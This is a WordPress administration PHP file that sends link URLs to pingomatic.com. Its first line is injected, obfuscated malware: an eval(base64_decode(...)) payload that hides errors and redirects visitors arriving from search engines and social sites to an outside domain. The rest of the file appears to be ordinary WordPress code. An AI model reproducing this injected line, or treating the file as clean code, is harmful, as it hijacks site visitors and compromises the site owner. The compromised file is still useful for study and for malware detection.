<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Send blog links to pingomatic.com to update.
 *
 * You can disable this feature by deleting the option 'use_linksupdate' or
 * setting the option to false. If no links exist, then no links are sent.
 *
 * Snoopy is included, but is not used. Fsockopen() is used instead to send link
 * URLs.
 *
 * @package WordPress
 * @subpackage Administration
 */

/** Load WordPress Bootstrap */
require_once('../wp-load.php');

if ( !get_option('use_linksupdate') )
	wp_die(__('Feature disabled.'));

$link_uris = $wpdb->get_col("SELECT link_url FROM $wpdb->links");

if ( !$link_uris )
	wp_die(__('No links'));

$link_uris = urlencode( join( $link_uris, "\n" ) );

$query_string = "uris=$link_uris";

$options = array();
$options['timeout'] = 30;
$options['body'] = $query_string;

$options['headers'] = array(
	'content-type' => 'application/x-www-form-urlencoded; charset='.get_option('blog_charset'),
	'content-length' => strlen( $query_string ),
);

$response = wp_remote_get('http://api.pingomatic.com/updated-batch/', $options);

if ( is_wp_error( $response ) )
	wp_die(__('Request Failed.'));

if ( $response['response']['code'] != 200 )
	wp_die(__('Request Failed.'));

$body = str_replace(array("\r\n", "\r"), "\n", $response['body']);
$returns = explode("\n", $body);

foreach ($returns as $return) {
	$time = substr($return, 0, 19);
	$uri = preg_replace('/(.*?) | (.*?)/', '$2', $return);
	$wpdb->update( $wpdb->links, array('link_updated' => $time), array('link_url' => $uri) );
}

?>
